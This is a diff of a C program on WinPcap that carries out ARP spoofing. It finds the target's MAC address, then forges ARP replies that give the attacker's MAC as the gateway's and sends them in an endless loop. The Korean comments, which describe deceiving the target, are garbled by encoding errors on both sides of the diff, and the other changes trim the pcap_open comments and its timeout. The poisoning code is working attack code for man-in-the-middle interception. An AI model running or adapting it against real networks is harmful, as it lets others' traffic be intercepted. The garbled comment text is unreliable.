@@ -83,7 +83,7 @@ int main(int argc, char *argv[])
 	char errbuf[PCAP_ERRBUF_SIZE];
 	const char* target_ip = argv[1];
 
-	// Local IP Address, Local MAC Address, Gateway¸¦ ¾ò¾î¿Â´Ù.  
+	// Local IP Address, Local MAC Address, Gatewayë¥¼ ì–»ì–´ì˜¨ë‹¤.  
 	char *Myip = (char*)malloc(16);
 	char *Gateway = (char*)malloc(16);
 	char *Mymac = (char*)malloc(17);
@@ -92,7 +92,7 @@ int main(int argc, char *argv[])
 	u_int8_t target_mac[8];
 	unsigned int IntGateip;
 
-	PIP_ADAPTER_INFO AdapterInfo;	// ¾îµªÅÍ°¡ °¡Áö°í ÀÖ´Â Á¤º¸¸¦ ÀúÀå
+	PIP_ADAPTER_INFO AdapterInfo;	// ì–´ëí„°ê°€ ê°€ì§€ê³  ìˆëŠ” ì •ë³´ë¥¼ ì €ì¥
 	PIP_ADAPTER_INFO pAdapter = NULL;
 	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
 	DWORD dwRetVal = 0;
@@ -149,13 +149,12 @@ int main(int argc, char *argv[])
 
 	printf("%s\n", dev->name);
 
-	if ((pkt = pcap_open(dev->name,          // name of the device
-		65536,            // portion of the packet to capture
-						  // 65536 guarantees that the whole packet will be captured on all the link layers
-		PCAP_OPENFLAG_PROMISCUOUS,    // promiscuous mode
-		1000,             // read timeout
-		NULL,             // authentication on the remote machine
-		errbuf            // error buffer
+	if ((pkt = pcap_open(dev->name, 
+		65536,
+		PCAP_OPENFLAG_PROMISCUOUS,
+		1,
+		NULL,
+		errbuf
 	)) == NULL)
 	{
 		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", dev->name);
@@ -194,7 +193,7 @@ int main(int argc, char *argv[])
 		temp--;
 	}
 
-	/* »ó´ë¹æÀÇ reply ÆĞÅ¶À» °¡Á®¿Í¼­ mac address È¹µæÇÏ±â */
+	/* ìƒëŒ€ë°©ì˜ reply íŒ¨í‚·ì„ ê°€ì ¸ì™€ì„œ mac address íšë“í•˜ê¸° */
 	
 	while ((res = pcap_next_ex(pkt, &pkt_header, &pkt_data)) >= 0) {
 		if (res == 0)
@@ -213,14 +212,14 @@ int main(int argc, char *argv[])
 		}
 	}
 
-	/* ³ª¸¦ gateway¶ó°í ¼ÓÀÌ´Â arp reply ÆĞÅ¶ Àü¼Û */
+	/* ë‚˜ë¥¼ gatewayë¼ê³  ì†ì´ëŠ” arp reply íŒ¨í‚· ì „ì†¡ */
 
 	u_char poison_pkt[ETH_HDRLEN + ARP_HDRLEN];
 
 	ETHER_HDR *ps_eth = (ETHER_HDR*)poison_pkt;
-	memcpy(ps_eth->ether_dhost, target_mac, sizeof(ps_eth->ether_dhost)); // µµÂøÁö´Â target mac
-	memcpy(ps_eth->ether_shost, byteMAC, sizeof(ps_eth->ether_shost));	// Ãâ¹ßÁö´Â byte mac
-	ps_eth->ether_type = htons(ETHERTYPE_ARP);	// º¸³»´Â ÆĞÅ¶Àº arp ÆĞÅ¶
+	memcpy(ps_eth->ether_dhost, target_mac, sizeof(ps_eth->ether_dhost)); // ë„ì°©ì§€ëŠ” target mac
+	memcpy(ps_eth->ether_shost, byteMAC, sizeof(ps_eth->ether_shost));	// ì¶œë°œì§€ëŠ” byte mac
+	ps_eth->ether_type = htons(ETHERTYPE_ARP);	// ë³´ë‚´ëŠ” íŒ¨í‚·ì€ arp íŒ¨í‚·
 
 	ARP_HDR *ps_arp = (ARP_HDR*)(poison_pkt + ETH_HDRLEN);
 	ps_arp->htype = htons(ARPHRD_ETHER);
@@ -228,9 +227,9 @@ int main(int argc, char *argv[])
 	ps_arp->hlen = sizeof(mac);
 	ps_arp->plen = sizeof(ip_address);
 	ps_arp->opcode = htons(ARP_OP_REPLY);
-	memcpy(ps_arp->sender_mac, byteMAC, sizeof(ps_arp->sender_mac));		// gatewayÀÇ ¸ÆÀº ³» macÀÌ¾ß!
-	*(unsigned int*)(ps_arp->sender_ip) = IntGateip;		//gateway ip·Î ¼ÓÀÎ´Ù!!
-	memcpy(ps_arp->target_mac, target_mac, sizeof(ps_arp->target_mac));	// »ó´ë¹æ¿¡°Ô ÀÀ´ä! 
+	memcpy(ps_arp->sender_mac, byteMAC, sizeof(ps_arp->sender_mac));		// gatewayì˜ ë§¥ì€ ë‚´ macì´ì•¼!
+	*(unsigned int*)(ps_arp->sender_ip) = IntGateip;		//gateway ipë¡œ ì†ì¸ë‹¤!!
+	memcpy(ps_arp->target_mac, target_mac, sizeof(ps_arp->target_mac));	// ìƒëŒ€ë°©ì—ê²Œ ì‘ë‹µ! 
 	*(unsigned int*)(ps_arp->target_ip) = (unsigned int)inet_addr(target_ip);
 
 	while (1) {
